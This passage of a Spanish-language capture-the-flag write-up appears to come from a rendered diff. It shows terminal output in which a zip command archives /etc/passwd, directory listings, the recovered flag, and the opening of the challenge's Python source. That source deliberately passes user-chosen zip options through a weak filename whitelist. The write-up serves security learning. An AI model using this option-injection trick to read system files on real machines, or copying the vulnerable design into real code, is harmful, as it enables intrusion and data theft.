+</span><span id="__span-7-17"><a id="__codelineno-7-17" name="__codelineno-7-17" href="#__codelineno-7-17"></a><span class="w">  </span>adding:<span class="w"> </span>etc/passwd<span class="w"> </span><span class="o">(</span>deflated<span class="w"> </span><span class="m">62</span>%<span class="o">)</span>
+</span><span id="__span-7-18"><a id="__codelineno-7-18" name="__codelineno-7-18" href="#__codelineno-7-18"></a>ls<span class="w"> </span>-la
+</span><span id="__span-7-19"><a id="__codelineno-7-19" name="__codelineno-7-19" href="#__codelineno-7-19"></a>total<span class="w"> </span><span class="m">12</span>
+</span><span id="__span-7-20"><a id="__codelineno-7-20" name="__codelineno-7-20" href="#__codelineno-7-20"></a>drwxr-sr-x<span class="w">    </span><span class="m">2</span><span class="w"> </span>ctf<span class="w">      </span>ctf<span class="w">           </span><span class="m">4096</span><span class="w"> </span>May<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">23</span>:01<span class="w"> </span>.
+</span><span id="__span-7-21"><a id="__codelineno-7-21" name="__codelineno-7-21" href="#__codelineno-7-21"></a>drwxr-sr-x<span class="w">    </span><span class="m">6</span><span class="w"> </span>ctf<span class="w">      </span>ctf<span class="w">           </span><span class="m">4096</span><span class="w"> </span>May<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">23</span>:00<span class="w"> </span>..
+</span><span id="__span-7-22"><a id="__codelineno-7-22" name="__codelineno-7-22" href="#__codelineno-7-22"></a>-rw-------<span class="w">    </span><span class="m">1</span><span class="w"> </span>ctf<span class="w">      </span>ctf<span class="w">            </span><span class="m">650</span><span class="w"> </span>May<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">23</span>:01<span class="w"> </span>zikfJpfK
+</span><span id="__span-7-23"><a id="__codelineno-7-23" name="__codelineno-7-23" href="#__codelineno-7-23"></a><span class="nb">cd</span><span class="w"> </span>..
+</span><span id="__span-7-24"><a id="__codelineno-7-24" name="__codelineno-7-24" href="#__codelineno-7-24"></a>ls<span class="w"> </span>-la
+</span><span id="__span-7-25"><a id="__codelineno-7-25" name="__codelineno-7-25" href="#__codelineno-7-25"></a>total<span class="w"> </span><span class="m">24</span>
+</span><span id="__span-7-26"><a id="__codelineno-7-26" name="__codelineno-7-26" href="#__codelineno-7-26"></a>drwxr-sr-x<span class="w">    </span><span class="m">6</span><span class="w"> </span>ctf<span class="w">      </span>ctf<span class="w">           </span><span class="m">4096</span><span class="w"> </span>May<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">23</span>:00<span class="w"> </span>.
+</span><span id="__span-7-27"><a id="__codelineno-7-27" name="__codelineno-7-27" href="#__codelineno-7-27"></a>drwxr-sr-x<span class="w">    </span><span class="m">1</span><span class="w"> </span>ctf<span class="w">      </span>ctf<span class="w">           </span><span class="m">4096</span><span class="w"> </span>May<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">23</span>:00<span class="w"> </span>..
+</span><span id="__span-7-28"><a id="__codelineno-7-28" name="__codelineno-7-28" href="#__codelineno-7-28"></a>drwxr-sr-x<span class="w">    </span><span class="m">2</span><span class="w"> </span>ctf<span class="w">      </span>ctf<span class="w">           </span><span class="m">4096</span><span class="w"> </span>May<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">23</span>:00<span class="w"> </span>Hands
+</span><span id="__span-7-29"><a id="__codelineno-7-29" name="__codelineno-7-29" href="#__codelineno-7-29"></a>drwxr-sr-x<span class="w">    </span><span class="m">2</span><span class="w"> </span>ctf<span class="w">      </span>ctf<span class="w">           </span><span class="m">4096</span><span class="w"> </span>May<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">23</span>:01<span class="w"> </span>Head
+</span><span id="__span-7-30"><a id="__codelineno-7-30" name="__codelineno-7-30" href="#__codelineno-7-30"></a>drwxr-sr-x<span class="w">    </span><span class="m">2</span><span class="w"> </span>ctf<span class="w">      </span>ctf<span class="w">           </span><span class="m">4096</span><span class="w"> </span>May<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">23</span>:00<span class="w"> </span>Legs
+</span><span id="__span-7-31"><a id="__codelineno-7-31" name="__codelineno-7-31" href="#__codelineno-7-31"></a>drwxr-sr-x<span class="w">    </span><span class="m">2</span><span class="w"> </span>ctf<span class="w">      </span>ctf<span class="w">           </span><span class="m">4096</span><span class="w"> </span>May<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">23</span>:00<span class="w"> </span>Torso
+</span><span id="__span-7-32"><a id="__codelineno-7-32" name="__codelineno-7-32" href="#__codelineno-7-32"></a><span class="nb">cd</span><span class="w"> </span>..
+</span><span id="__span-7-33"><a id="__codelineno-7-33" name="__codelineno-7-33" href="#__codelineno-7-33"></a>ls<span class="w"> </span>-la
+</span><span id="__span-7-34"><a id="__codelineno-7-34" name="__codelineno-7-34" href="#__codelineno-7-34"></a>total<span class="w"> </span><span class="m">44</span>
+</span><span id="__span-7-35"><a id="__codelineno-7-35" name="__codelineno-7-35" href="#__codelineno-7-35"></a>drwxr-sr-x<span class="w">    </span><span class="m">1</span><span class="w"> </span>ctf<span class="w">      </span>ctf<span class="w">           </span><span class="m">4096</span><span class="w"> </span>May<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">23</span>:00<span class="w"> </span>.
+</span><span id="__span-7-36"><a id="__codelineno-7-36" name="__codelineno-7-36" href="#__codelineno-7-36"></a>drwxr-xr-x<span class="w">    </span><span class="m">1</span><span class="w"> </span>root<span class="w">     </span>root<span class="w">          </span><span class="m">4096</span><span class="w"> </span>Mar<span class="w">  </span><span class="m">3</span><span class="w"> </span><span class="m">15</span>:18<span class="w"> </span>..
+</span><span id="__span-7-37"><a id="__codelineno-7-37" name="__codelineno-7-37" href="#__codelineno-7-37"></a>drwxr-sr-x<span class="w">    </span><span class="m">6</span><span class="w"> </span>ctf<span class="w">      </span>ctf<span class="w">           </span><span class="m">4096</span><span class="w"> </span>May<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">22</span>:57<span class="w"> </span>5pSXN8iJRdGc7Y8nk5oNcKcrJKFTPK21
+</span><span id="__span-7-38"><a id="__codelineno-7-38" name="__codelineno-7-38" href="#__codelineno-7-38"></a>-rwxrwxr-x<span class="w">    </span><span class="m">1</span><span class="w"> </span>root<span class="w">     </span>root<span class="w">          </span><span class="m">3166</span><span class="w"> </span>May<span class="w"> </span><span class="m">12</span><span class="w"> </span><span class="m">23</span>:51<span class="w"> </span>artifacts.py
+</span><span id="__span-7-39"><a id="__codelineno-7-39" name="__codelineno-7-39" href="#__codelineno-7-39"></a>-rw-rw-r--<span class="w">    </span><span class="m">1</span><span class="w"> </span>root<span class="w">     </span>root<span class="w">           </span><span class="m">263</span><span class="w"> </span>May<span class="w"> </span><span class="m">12</span><span class="w"> </span><span class="m">23</span>:32<span class="w"> </span>clear.py
+</span><span id="__span-7-40"><a id="__codelineno-7-40" name="__codelineno-7-40" href="#__codelineno-7-40"></a>-rw-rw-r--<span class="w">    </span><span class="m">1</span><span class="w"> </span>root<span class="w">     </span>root<span class="w">            </span><span class="m">38</span><span class="w"> </span>May<span class="w"> </span><span class="m">12</span><span class="w"> </span><span class="m">17</span>:37<span class="w"> </span>flag.txt
+</span><span id="__span-7-41"><a id="__codelineno-7-41" name="__codelineno-7-41" href="#__codelineno-7-41"></a>drwxr-sr-x<span class="w">    </span><span class="m">6</span><span class="w"> </span>ctf<span class="w">      </span>ctf<span class="w">           </span><span class="m">4096</span><span class="w"> </span>May<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">22</span>:55<span class="w"> </span>kPeKQsYEx9Z6ZKkBrdtWmQKdS98CURJl
+</span><span id="__span-7-42"><a id="__codelineno-7-42" name="__codelineno-7-42" href="#__codelineno-7-42"></a>drwxr-sr-x<span class="w">    </span><span class="m">6</span><span class="w"> </span>ctf<span class="w">      </span>ctf<span class="w">           </span><span class="m">4096</span><span class="w"> </span>May<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">22</span>:54<span class="w"> </span>kWHPODHQFKSletaDKHB2AgJslbm6fwbb
+</span><span id="__span-7-43"><a id="__codelineno-7-43" name="__codelineno-7-43" href="#__codelineno-7-43"></a>drwxr-sr-x<span class="w">    </span><span class="m">6</span><span class="w"> </span>ctf<span class="w">      </span>ctf<span class="w">           </span><span class="m">4096</span><span class="w"> </span>May<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">23</span>:00<span class="w"> </span>tHV1tdX82QcPllglF8wa6AhU24FRZS4S
+</span><span id="__span-7-44"><a id="__codelineno-7-44" name="__codelineno-7-44" href="#__codelineno-7-44"></a>drwxr-sr-x<span class="w">    </span><span class="m">6</span><span class="w"> </span>ctf<span class="w">      </span>ctf<span class="w">           </span><span class="m">4096</span><span class="w"> </span>May<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">22</span>:55<span class="w"> </span>wqVpR4QLSsuu5QiWRqhPNLuYh2aHzlaI
+</span></code></pre></div>
+<blockquote>
+<p>FLAG: HTB{GTFO_4nd_m4k3_th3_b35t_4rt1f4ct5}</p>
+</blockquote>
+<h5 id="composicion">Composición</h5>
+<p>Como parte del ejercicio "post-reto" se extrajo el código correspondiente al reto (<code>artifacts.py</code> y clear.py).</p>
+<div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">artifacts.py</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">  1</a></span>
+<span class="normal"><a href="#__codelineno-8-2">  2</a></span>
+<span class="normal"><a href="#__codelineno-8-3">  3</a></span>
+<span class="normal"><a href="#__codelineno-8-4">  4</a></span>
+<span class="normal"><a href="#__codelineno-8-5">  5</a></span>
+<span class="normal"><a href="#__codelineno-8-6">  6</a></span>
+<span class="normal"><a href="#__codelineno-8-7">  7</a></span>
+<span class="normal"><a href="#__codelineno-8-8">  8</a></span>
+<span class="normal"><a href="#__codelineno-8-9">  9</a></span>
+<span class="normal"><a href="#__codelineno-8-10"> 10</a></span>
+<span class="normal"><a href="#__codelineno-8-11"> 11</a></span>
+<span class="normal"><a href="#__codelineno-8-12"> 12</a></span>
+<span class="normal"><a href="#__codelineno-8-13"> 13</a></span>
+<span class="normal"><a href="#__codelineno-8-14"> 14</a></span>
+<span class="normal"><a href="#__codelineno-8-15"> 15</a></span>
+<span class="normal"><a href="#__codelineno-8-16"> 16</a></span>
+<span class="normal"><a href="#__codelineno-8-17"> 17</a></span>
+<span class="normal"><a href="#__codelineno-8-18"> 18</a></span>
+<span class="normal"><a href="#__codelineno-8-19"> 19</a></span>
+<span class="normal"><a href="#__codelineno-8-20"> 20</a></span>
+<span class="normal"><a href="#__codelineno-8-21"> 21</a></span>
+<span class="normal"><a href="#__codelineno-8-22"> 22</a></span>
+<span class="normal"><a href="#__codelineno-8-23"> 23</a></span>
+<span class="normal"><a href="#__codelineno-8-24"> 24</a></span>
+<span class="normal"><a href="#__codelineno-8-25"> 25</a></span>
+<span class="normal"><a href="#__codelineno-8-26"> 26</a></span>
+<span class="normal"><a href="#__codelineno-8-27"> 27</a></span>
+<span class="normal"><a href="#__codelineno-8-28"> 28</a></span>
+<span class="normal"><a href="#__codelineno-8-29"> 29</a></span>
+<span class="normal"><a href="#__codelineno-8-30"> 30</a></span>
+<span class="normal"><a href="#__codelineno-8-31"> 31</a></span>
+<span class="normal"><a href="#__codelineno-8-32"> 32</a></span>
+<span class="normal"><a href="#__codelineno-8-33"> 33</a></span>
+<span class="normal"><a href="#__codelineno-8-34"> 34</a></span>
+<span class="normal"><a href="#__codelineno-8-35"> 35</a></span>
+<span class="normal"><a href="#__codelineno-8-36"> 36</a></span>
+<span class="normal"><a href="#__codelineno-8-37"> 37</a></span>
+<span class="normal"><a href="#__codelineno-8-38"> 38</a></span>
+<span class="normal"><a href="#__codelineno-8-39"> 39</a></span>
+<span class="normal"><a href="#__codelineno-8-40"> 40</a></span>
+<span class="normal"><a href="#__codelineno-8-41"> 41</a></span>
+<span class="normal"><a href="#__codelineno-8-42"> 42</a></span>
+<span class="normal"><a href="#__codelineno-8-43"> 43</a></span>
+<span class="normal"><a href="#__codelineno-8-44"> 44</a></span>
+<span class="normal"><a href="#__codelineno-8-45"> 45</a></span>
+<span class="normal"><a href="#__codelineno-8-46"> 46</a></span>
+<span class="normal"><a href="#__codelineno-8-47"> 47</a></span>
+<span class="normal"><a href="#__codelineno-8-48"> 48</a></span>
+<span class="normal"><a href="#__codelineno-8-49"> 49</a></span>
+<span class="normal"><a href="#__codelineno-8-50"> 50</a></span>
+<span class="normal"><a href="#__codelineno-8-51"> 51</a></span>
+<span class="normal"><a href="#__codelineno-8-52"> 52</a></span>
+<span class="normal"><a href="#__codelineno-8-53"> 53</a></span>
+<span class="normal"><a href="#__codelineno-8-54"> 54</a></span>
+<span class="normal"><a href="#__codelineno-8-55"> 55</a></span>
+<span class="normal"><a href="#__codelineno-8-56"> 56</a></span>
+<span class="normal"><a href="#__codelineno-8-57"> 57</a></span>
+<span class="normal"><a href="#__codelineno-8-58"> 58</a></span>
+<span class="normal"><a href="#__codelineno-8-59"> 59</a></span>
+<span class="normal"><a href="#__codelineno-8-60"> 60</a></span>
+<span class="normal"><a href="#__codelineno-8-61"> 61</a></span>
+<span class="normal"><a href="#__codelineno-8-62"> 62</a></span>
+<span class="normal"><a href="#__codelineno-8-63"> 63</a></span>
+<span class="normal"><a href="#__codelineno-8-64"> 64</a></span>
+<span class="normal"><a href="#__codelineno-8-65"> 65</a></span>
+<span class="normal"><a href="#__codelineno-8-66"> 66</a></span>
+<span class="normal"><a href="#__codelineno-8-67"> 67</a></span>
+<span class="normal"><a href="#__codelineno-8-68"> 68</a></span>
+<span class="normal"><a href="#__codelineno-8-69"> 69</a></span>
+<span class="normal"><a href="#__codelineno-8-70"> 70</a></span>
+<span class="normal"><a href="#__codelineno-8-71"> 71</a></span>
+<span class="normal"><a href="#__codelineno-8-72"> 72</a></span>
+<span class="normal"><a href="#__codelineno-8-73"> 73</a></span>
+<span class="normal"><a href="#__codelineno-8-74"> 74</a></span>
+<span class="normal"><a href="#__codelineno-8-75"> 75</a></span>
+<span class="normal"><a href="#__codelineno-8-76"> 76</a></span>
+<span class="normal"><a href="#__codelineno-8-77"> 77</a></span>
+<span class="normal"><a href="#__codelineno-8-78"> 78</a></span>
+<span class="normal"><a href="#__codelineno-8-79"> 79</a></span>
+<span class="normal"><a href="#__codelineno-8-80"> 80</a></span>
+<span class="normal"><a href="#__codelineno-8-81"> 81</a></span>
+<span class="normal"><a href="#__codelineno-8-82"> 82</a></span>
+<span class="normal"><a href="#__codelineno-8-83"> 83</a></span>
+<span class="normal"><a href="#__codelineno-8-84"> 84</a></span>
+<span class="normal"><a href="#__codelineno-8-85"> 85</a></span>
+<span class="normal"><a href="#__codelineno-8-86"> 86</a></span>
+<span class="normal"><a href="#__codelineno-8-87"> 87</a></span>
+<span class="normal"><a href="#__codelineno-8-88"> 88</a></span>
+<span class="normal"><a href="#__codelineno-8-89"> 89</a></span>
+<span class="normal"><a href="#__codelineno-8-90"> 90</a></span>
+<span class="normal"><a href="#__codelineno-8-91"> 91</a></span>
+<span class="normal"><a href="#__codelineno-8-92"> 92</a></span>
+<span class="normal"><a href="#__codelineno-8-93"> 93</a></span>
+<span class="normal"><a href="#__codelineno-8-94"> 94</a></span>
+<span class="normal"><a href="#__codelineno-8-95"> 95</a></span>
+<span class="normal"><a href="#__codelineno-8-96"> 96</a></span>
+<span class="normal"><a href="#__codelineno-8-97"> 97</a></span>
+<span class="normal"><a href="#__codelineno-8-98"> 98</a></span>
+<span class="normal"><a href="#__codelineno-8-99"> 99</a></span>
+<span class="normal"><a href="#__codelineno-8-100">100</a></span>
+<span class="normal"><a href="#__codelineno-8-101">101</a></span>
+<span class="normal"><a href="#__codelineno-8-102">102</a></span>
+<span class="normal"><a href="#__codelineno-8-103">103</a></span>
+<span class="normal"><a href="#__codelineno-8-104">104</a></span>
+<span class="normal"><a href="#__codelineno-8-105">105</a></span>
+<span class="normal"><a href="#__codelineno-8-106">106</a></span>
+<span class="normal"><a href="#__codelineno-8-107">107</a></span>
+<span class="normal"><a href="#__codelineno-8-108">108</a></span>
+<span class="normal"><a href="#__codelineno-8-109">109</a></span>
+<span class="normal"><a href="#__codelineno-8-110">110</a></span>
+<span class="normal"><a href="#__codelineno-8-111">111</a></span>
+<span class="normal"><a href="#__codelineno-8-112">112</a></span>
+<span class="normal"><a href="#__codelineno-8-113">113</a></span>
+<span class="normal"><a href="#__codelineno-8-114">114</a></span>
+<span class="normal"><a href="#__codelineno-8-115">115</a></span>
+<span class="normal"><a href="#__codelineno-8-116">116</a></span>
+<span class="normal"><a href="#__codelineno-8-117">117</a></span>
+<span class="normal"><a href="#__codelineno-8-118">118</a></span>
+<span class="normal"><a href="#__codelineno-8-119">119</a></span>
+<span class="normal"><a href="#__codelineno-8-120">120</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a><span class="ch">#!/usr/bin/python3</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2"></a><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">random</span>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3"></a><span class="kn">from</span> <span class="nn">termcolor</span> <span class="kn">import</span> <span class="n">colored</span>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4"></a>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5"></a>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6"></a><span class="n">whitelist</span> <span class="o">=</span> <span class="s2">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_.&#39;#/ &quot;</span>
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7"></a><span class="n">PATH</span> <span class="o">=</span> <span class="s2">&quot;./&quot;</span>
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8"></a><span class="n">sub_array</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;Head&quot;</span><span class="p">,</span> <span class="s2">&quot;Torso&quot;</span><span class="p">,</span> <span class="s2">&quot;Hands&quot;</span><span class="p">,</span> <span class="s2">&quot;Legs&quot;</span><span class="p">]</span>
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9"></a>
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10"></a><span class="c1"># Create random directory</span>
+</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11"></a><span class="k">def</span> <span class="nf">rand_dirname</span><span class="p">(</span><span class="n">length</span><span class="o">=</span><span class="mi">32</span><span class="p">):</span>
+</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12"></a>    <span class="n">charset</span> <span class="o">=</span> <span class="s2">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>
+</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13"></a>    <span class="n">dirname</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+</span><span id="__span-8-14"><a id="__codelineno-8-14" name="__codelineno-8-14"></a>    <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">dirname</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">length</span><span class="p">:</span>
+</span><span id="__span-8-15"><a id="__codelineno-8-15" name="__codelineno-8-15"></a>        <span class="n">dirname</span> <span class="o">+=</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">charset</span><span class="p">)</span>
+</span><span id="__span-8-16"><a id="__codelineno-8-16" name="__codelineno-8-16"></a>    <span class="k">return</span> <span class="n">dirname</span>
+</span><span id="__span-8-17"><a id="__codelineno-8-17" name="__codelineno-8-17"></a>
+</span><span id="__span-8-18"><a id="__codelineno-8-18" name="__codelineno-8-18"></a><span class="k">def</span> <span class="nf">check_filename</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
+</span><span id="__span-8-19"><a id="__codelineno-8-19" name="__codelineno-8-19"></a>    <span class="k">return</span> <span class="nb">all</span><span class="p">(</span><span class="n">i</span> <span class="ow">in</span> <span class="n">whitelist</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">filename</span><span class="p">)</span>
+</span><span id="__span-8-20"><a id="__codelineno-8-20" name="__codelineno-8-20"></a>
+</span><span id="__span-8-21"><a id="__codelineno-8-21" name="__codelineno-8-21"></a><span class="k">def</span> <span class="nf">change_sub_dir</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">color</span><span class="p">):</span>
+</span><span id="__span-8-22"><a id="__codelineno-8-22" name="__codelineno-8-22"></a>  <span class="nb">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[*] Sub-directory to work in: </span><span class="si">{</span><span class="n">dirname</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">sub_array</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">color</span><span class="p">))</span>
+</span><span id="__span-8-23"><a id="__codelineno-8-23" name="__codelineno-8-23"></a>  <span class="n">os</span><span class="o">.</span><span class="n">chdir</span><span class="p">(</span><span class="n">PATH</span> <span class="o">+</span> <span class="n">sub_array</span><span class="p">[</span><span class="n">idx</span><span class="p">])</span>
+</span><span id="__span-8-24"><a id="__codelineno-8-24" name="__codelineno-8-24"></a>
+</span><span id="__span-8-25"><a id="__codelineno-8-25" name="__codelineno-8-25"></a><span class="k">def</span> <span class="nf">subjects</span><span class="p">():</span>
+</span><span id="__span-8-26"><a id="__codelineno-8-26" name="__codelineno-8-26"></a>  <span class="n">subs</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;</span><span class="se">\n</span><span class="s2">Component List:</span>
+</span><span id="__span-8-27"><a id="__codelineno-8-27" name="__codelineno-8-27"></a>
+</span><span id="__span-8-28"><a id="__codelineno-8-28" name="__codelineno-8-28"></a><span class="s2">+===============+</span>
+</span><span id="__span-8-29"><a id="__codelineno-8-29" name="__codelineno-8-29"></a><span class="s2">|               |</span>
+</span><span id="__span-8-30"><a id="__codelineno-8-30" name="__codelineno-8-30"></a><span class="s2">|  1. Head  🤖  |</span>
+</span><span id="__span-8-31"><a id="__codelineno-8-31" name="__codelineno-8-31"></a><span class="s2">|  2. Torso 🦴   |</span>
+</span><span id="__span-8-32"><a id="__codelineno-8-32" name="__codelineno-8-32"></a><span class="s2">|  3. Hands 💪  |</span>
+</span><span id="__span-8-33"><a id="__codelineno-8-33" name="__codelineno-8-33"></a><span class="s2">|  4. Legs  🦵   |</span>
+</span><span id="__span-8-34"><a id="__codelineno-8-34" name="__codelineno-8-34"></a><span class="s2">|               |</span>
+</span><span id="__span-8-35"><a id="__codelineno-8-35" name="__codelineno-8-35"></a><span class="s2">+===============+</span>
+</span><span id="__span-8-36"><a id="__codelineno-8-36" name="__codelineno-8-36"></a><span class="s2">  &quot;&quot;&quot;</span>
+</span><span id="__span-8-37"><a id="__codelineno-8-37" name="__codelineno-8-37"></a>  <span class="nb">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="n">subs</span><span class="p">,</span> <span class="s2">&quot;magenta&quot;</span><span class="p">))</span>
+</span><span id="__span-8-38"><a id="__codelineno-8-38" name="__codelineno-8-38"></a>  <span class="n">ans</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="s2">&quot;[*] Choose component: &quot;</span><span class="p">,</span> <span class="s2">&quot;magenta&quot;</span><span class="p">)))</span>
+</span><span id="__span-8-39"><a id="__codelineno-8-39" name="__codelineno-8-39"></a>
+</span><span id="__span-8-40"><a id="__codelineno-8-40" name="__codelineno-8-40"></a>  <span class="k">if</span> <span class="n">ans</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+</span><span id="__span-8-41"><a id="__codelineno-8-41" name="__codelineno-8-41"></a>    <span class="n">change_sub_dir</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s2">&quot;blue&quot;</span><span class="p">)</span>
+</span><span id="__span-8-42"><a id="__codelineno-8-42" name="__codelineno-8-42"></a>  <span class="k">elif</span> <span class="n">ans</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
+</span><span id="__span-8-43"><a id="__codelineno-8-43" name="__codelineno-8-43"></a>    <span class="n">change_sub_dir</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s2">&quot;green&quot;</span><span class="p">)</span>
+</span><span id="__span-8-44"><a id="__codelineno-8-44" name="__codelineno-8-44"></a>  <span class="k">elif</span> <span class="n">ans</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
+</span><span id="__span-8-45"><a id="__codelineno-8-45" name="__codelineno-8-45"></a>    <span class="n">change_sub_dir</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s2">&quot;cyan&quot;</span><span class="p">)</span>
+</span><span id="__span-8-46"><a id="__codelineno-8-46" name="__codelineno-8-46"></a>  <span class="k">elif</span> <span class="n">ans</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
+</span><span id="__span-8-47"><a id="__codelineno-8-47" name="__codelineno-8-47"></a>    <span class="n">change_sub_dir</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s2">&quot;yellow&quot;</span><span class="p">)</span>
+</span><span id="__span-8-48"><a id="__codelineno-8-48" name="__codelineno-8-48"></a>  <span class="k">else</span><span class="p">:</span>
+</span><span id="__span-8-49"><a id="__codelineno-8-49" name="__codelineno-8-49"></a>    <span class="nb">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[-] Invalid option!</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;red&quot;</span><span class="p">))</span>
+</span><span id="__span-8-50"><a id="__codelineno-8-50" name="__codelineno-8-50"></a>    <span class="n">exit</span><span class="p">()</span>
+</span><span id="__span-8-51"><a id="__codelineno-8-51" name="__codelineno-8-51"></a>
+</span><span id="__span-8-52"><a id="__codelineno-8-52" name="__codelineno-8-52"></a><span class="k">def</span> <span class="nf">menu</span><span class="p">():</span>
+</span><span id="__span-8-53"><a id="__codelineno-8-53" name="__codelineno-8-53"></a>  <span class="n">m</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;</span>
+</span><span id="__span-8-54"><a id="__codelineno-8-54" name="__codelineno-8-54"></a><span class="s2">Actions:</span>
+</span><span id="__span-8-55"><a id="__codelineno-8-55" name="__codelineno-8-55"></a>
+</span><span id="__span-8-56"><a id="__codelineno-8-56" name="__codelineno-8-56"></a><span class="s2">1. Create artifact</span>
+</span><span id="__span-8-57"><a id="__codelineno-8-57" name="__codelineno-8-57"></a><span class="s2">2. List directory    (pwd; ls -la)</span>
+</span><span id="__span-8-58"><a id="__codelineno-8-58" name="__codelineno-8-58"></a><span class="s2">3. Read artifact     (cat ./&lt;name&gt;)</span>
+</span><span id="__span-8-59"><a id="__codelineno-8-59" name="__codelineno-8-59"></a><span class="s2">4. Compress artifact (zip &lt;name&gt;.zip &lt;name&gt; &lt;options&gt;)</span>
+</span><span id="__span-8-60"><a id="__codelineno-8-60" name="__codelineno-8-60"></a><span class="s2">5. Change directory  (cd &lt;dirname&gt;)</span>
+</span><span id="__span-8-61"><a id="__codelineno-8-61" name="__codelineno-8-61"></a><span class="s2">6. Clean directory   (rm -rf ./*)</span>
+</span><span id="__span-8-62"><a id="__codelineno-8-62" name="__codelineno-8-62"></a><span class="s2">7. Exit</span>
+</span><span id="__span-8-63"><a id="__codelineno-8-63" name="__codelineno-8-63"></a><span class="s2">  &quot;&quot;&quot;</span>
+</span><span id="__span-8-64"><a id="__codelineno-8-64" name="__codelineno-8-64"></a>  <span class="nb">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="s2">&quot;yellow&quot;</span><span class="p">))</span>
+</span><span id="__span-8-65"><a id="__codelineno-8-65" name="__codelineno-8-65"></a>  <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="s2">&quot;[*] Choose action: &quot;</span><span class="p">,</span> <span class="s2">&quot;yellow&quot;</span><span class="p">)))</span>
+</span><span id="__span-8-66"><a id="__codelineno-8-66" name="__codelineno-8-66"></a>
+</span><span id="__span-8-67"><a id="__codelineno-8-67" name="__codelineno-8-67"></a><span class="k">def</span> <span class="nf">create_file</span><span class="p">():</span>
+</span><span id="__span-8-68"><a id="__codelineno-8-68" name="__codelineno-8-68"></a>  <span class="n">fname</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="s2">&quot;Insert name: &quot;</span><span class="p">,</span> <span class="s2">&quot;yellow&quot;</span><span class="p">))</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span><span id="__span-8-69"><a id="__codelineno-8-69" name="__codelineno-8-69"></a>  <span class="k">if</span> <span class="ow">not</span> <span class="n">check_filename</span><span class="p">(</span><span class="n">fname</span><span class="p">):</span>
